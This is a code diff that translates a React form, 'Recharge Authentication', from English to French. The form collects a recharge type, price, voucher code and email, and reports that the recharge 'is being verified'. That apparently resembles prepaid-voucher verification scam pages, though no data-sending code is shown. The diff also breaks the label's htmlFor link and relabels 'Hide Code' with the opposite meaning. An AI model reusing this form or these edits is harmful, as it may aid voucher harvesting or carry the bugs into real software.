@@ -75,33 +75,33 @@ const AuthForm: React.FC = () => {
     let isValid = true;
 
     if (!formData.rechargeType) {
-      newErrors.rechargeType = "Recharge type is required";
+      newErrors.rechargeType = "Type de recharge requis";
       isValid = false;
     }
 
     if (!formData.rechargePrice) {
-      newErrors.rechargePrice = "Price is required";
+      newErrors.rechargePrice = "Prix requis";
       isValid = false;
     } else if (
       isNaN(Number(formData.rechargePrice)) ||
       Number(formData.rechargePrice) <= 0
     ) {
-      newErrors.rechargePrice = "Price must be a positive number";
+      newErrors.rechargePrice = "Le prix doit être un nombre positif";
       isValid = false;
     }
 
     if (!formData.rechargeCode) {
-      newErrors.rechargeCode = "Recharge code is required";
+      newErrors.rechargeCode = "Code de recharge requis";
       isValid = false;
     }
 
     if (!formData.email) {
-      newErrors.email = "Email is required";
+      newErrors.email = "Email requis";
       isValid = false;
     } else {
       const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
       if (!emailRegex.test(formData.email)) {
-        newErrors.email = "Please enter a valid email";
+        newErrors.email = "Veuillez entrer un email valide";
         isValid = false;
       }
     }
@@ -131,12 +131,12 @@ const AuthForm: React.FC = () => {
 
       setSubmitStatus({
         success: true,
-        message: "✅ Your recharge is being verified!",
+        message: "✅ Votre recharge est en cours de vérification!",
        });
     } catch (error) {
       setSubmitStatus({
         success: false,
-        message: "❌ Failed to submit the form. Please try again later.",
+        message: "❌ Échec de la soumission du formulaire. Veuillez réessayer plus tard.",
       });
       console.error("Form submission error:", error);
     } finally {
@@ -148,9 +148,9 @@ const AuthForm: React.FC = () => {
     <div className="w-full max-w-md mx-auto">
       <div className="bg-white rounded-lg shadow-lg overflow-hidden transform transition-all duration-300 hover:shadow-xl">
         <div className="bg-gradient-to-r from-blue-600 to-blue-800 py-4 px-6">
-          <h2 className="text-white text-xl font-bold">Recharge Authentication</h2>
+          <h2 className="text-white text-xl font-bold">Authentification de recharge</h2>
           <p className="text-blue-100 text-sm mt-1">
-            Enter your recharge details below
+            Entrez vos détails de recharge ci-dessous
           </p>
         </div>
 
@@ -169,7 +169,7 @@ const AuthForm: React.FC = () => {
 
           <FormSelect
             id="rechargeType"
-            label="Type of Recharge"
+            label="Type de recharge"
             value={formData.rechargeType}
             onChange={handleInputChange}
             options={rechargeTypes}
@@ -179,7 +179,7 @@ const AuthForm: React.FC = () => {
 
           <FormInput
             id="rechargePrice"
-            label="Price of Recharge"
+            label="Prix de la recharge"
             type="number"
             value={formData.rechargePrice}
             onChange={handleInputChange}
@@ -192,10 +192,10 @@ const AuthForm: React.FC = () => {
 
           <div className="mb-4">
             <label
-              htmlFor="rechargeCode"
+              htmlFor="Code de recharge"
               className="block text-gray-700 font-medium mb-2"
             >
-              Recharge Code <span className="text-red-500">*</span>
+              Code de recharge <span className="text-red-500">*</span>
             </label>
             <div className="relative">
               <input
@@ -204,7 +204,7 @@ const AuthForm: React.FC = () => {
                 value={formData.rechargeCode}
                 onChange={handleInputChange}
                 required
-                placeholder="Enter recharge code"
+                placeholder="Entrez le code de recharge"
                 className={`w-full px-4 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all duration-200 ${
                   errors.rechargeCode ? "border-red-500" : "border-gray-300"
                 }`}
@@ -235,7 +235,7 @@ const AuthForm: React.FC = () => {
 
           <FormSelect
             id="hideCode"
-            label="Hide Code"
+            label="Code de recharge visible"
             value={formData.hideCode}
             onChange={handleInputChange}
             options={hideCodeOptions}
@@ -252,7 +252,7 @@ const AuthForm: React.FC = () => {
                   : "bg-blue-600 hover:bg-blue-700 active:bg-blue-800 transform active:scale-[0.98]"
               } transition-all duration-200 shadow-md hover:shadow-lg`}
           >
-            {isSubmitting ? "Submitting..." : "Submit"}
+            {isSubmitting ? "Soumission en cours..." : "Soumettre"}
           </button>
         </form>
       </div>
